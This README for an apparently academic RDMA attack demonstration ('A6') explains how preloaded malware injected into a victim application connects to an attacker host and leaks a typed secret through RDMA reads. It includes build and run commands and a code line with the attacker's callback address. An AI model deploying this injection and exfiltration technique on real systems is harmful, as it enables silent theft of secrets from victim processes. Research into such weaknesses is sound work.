# (A6) Facilitating Attacks using RDMA


The attack shows if an attacker has the privilege to preload a library to a victim’s application, the attacker can misuse this
ability to *inject code* that establishes an RDMA connection to the attacker’s application.
The attacker waits for a connection from the victim, and then the attacker silently reads the victim's secret using RDMA reads.


## Requirements
 * GCC >= 4.9 with C++11 features
 * rdma-core library, or equivalent RDMA verbs library 
 * RDMA-capable network devices must have assigned IP addresses
 * ODP-capable RDMA device for ODP usage

## Usage 

To compile the code simply run `make`. 
Note, to run the attack, we require manually edit `victim.cpp` to specify the IP address of the attacker application.

To perform an attack, the attacker should be lunched using `./attacker -a <IP>`, where `<IP>` is the IP address of the attacker.
Then the malware of the victim code should be modified to establish the connection with the provided IP address. 
For that, modify the IP address in `victim.cpp`:
```
  // should be IP and port of the attacker
  ret = rdma_getaddrinfo("192.168.1.10","9999", &hints, &addrinfo);
```
Then the victim can be launched (`./victim`) on any node within the same network as the attacker. The victim application will invite you to type a secret. The secret will be fetched by the attacker using RDMA reads. Note, that the malware uses predictability of malloc (V4).


Basic usage example
```
make
./attacker -a 192.168.1.10
./victim
```

## On-demand paging 
To use ODP capabilities, we require to manually modify the preload malware of the victim. 
For that, you should modify the following lines of `victim.cpp`:
```
 // change to true to use implicit ODP.
  bool useodp = false;
```